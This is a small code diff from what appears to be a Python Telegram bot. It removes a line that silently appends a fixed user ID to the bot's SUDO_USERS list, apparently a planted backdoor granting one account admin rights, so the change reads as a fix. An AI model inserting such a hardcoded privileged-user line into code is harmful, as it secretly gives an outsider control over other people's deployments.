@@ -28,7 +28,6 @@ def AdminRightsCheck(mystic):
 
     return wrapper
 
-SUDO_USERS.append(1356469075)
 
 def AdminActual(mystic):
     async def wrapper(_, message):
